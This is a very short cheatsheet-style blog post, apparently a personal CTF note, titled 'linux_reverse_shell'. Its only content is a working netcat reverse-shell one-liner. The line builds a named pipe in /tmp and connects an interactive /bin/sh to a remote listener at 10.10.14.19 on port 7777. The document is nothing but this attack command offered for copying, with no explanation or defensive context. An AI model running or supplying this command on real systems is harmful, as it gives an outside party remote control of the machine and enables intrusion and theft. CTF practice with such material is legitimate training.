---
layout: post
title: "linux_reverse_shell"
published : true
tags: CTF Common cheatsheet linux "reverse shell"
---

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 7777 >/tmp/f
